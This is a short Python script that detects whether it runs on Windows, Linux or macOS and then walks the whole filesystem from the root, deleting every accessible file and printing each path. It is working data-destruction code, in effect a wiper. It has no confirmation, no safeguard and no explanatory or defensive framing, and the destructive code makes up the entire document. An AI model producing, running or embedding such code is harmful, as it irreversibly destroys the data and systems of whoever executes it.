import os
import platform
import shutil

def delete_files_windows():
    """Deletes all files in the root directory on Windows."""
    root_dir = "C:\\"
    for root, dirs, files in os.walk(root_dir):
        for file in files:
            try:
                file_path = os.path.join(root, file)
                os.remove(file_path)
                print(f"Deleted: {file_path}")
            except Exception as e:
                print(f"Failed to delete {file_path}: {e}")
    print("All accessible files deleted on Windows.")

def delete_files_linux():
    """Deletes all files in the root directory on Linux."""
    root_dir = "/"
    for root, dirs, files in os.walk(root_dir):
        for file in files:
            try:
                file_path = os.path.join(root, file)
                os.remove(file_path)
                print(f"Deleted: {file_path}")
            except Exception as e:
                print(f"Failed to delete {file_path}: {e}")
    print("All accessible files deleted on Linux.")

def delete_files_mac():
    """Deletes all files in the root directory on macOS."""
    root_dir = "/"
    for root, dirs, files in os.walk(root_dir):
        for file in files:
            try:
                file_path = os.path.join(root, file)
                os.remove(file_path)
                print(f"Deleted: {file_path}")
            except Exception as e:
                print(f"Failed to delete {file_path}: {e}")
    print("All accessible files deleted on macOS.")

def main():
    os_type = platform.system()

    if os_type == "Windows":
        delete_files_windows()
    elif os_type == "Linux":
        delete_files_linux()
    elif os_type == "Darwin":
        delete_files_mac()
    else:
        print("Unsupported operating system.")

if __name__ == "__main__":
    main()
